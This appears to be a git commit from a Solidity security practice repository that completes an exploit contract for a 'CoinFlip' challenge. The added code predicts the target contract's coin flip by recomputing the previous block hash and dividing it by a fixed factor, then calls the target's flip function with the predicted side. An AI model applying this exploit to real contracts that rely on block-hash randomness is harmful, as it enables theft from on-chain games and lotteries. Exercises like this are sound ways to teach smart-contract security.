5ffa45e8ce456be47e213f0018d993080f8b32c1
Roman Pavlovskyi <rpavlovskyi@gmail.com>
2022-08-07 10:41:38 -0700

    Complete 1. CoinFlip

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -1,15 +1,24 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
+import "hardhat/console.sol";
 
 contract AttackingCoinFlip {
     address public contractAddress;
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip victim;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
+        victim = CoinFlip(_contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        bool result = victim.flip(side);
+        console.log("result", result);
     }
 }
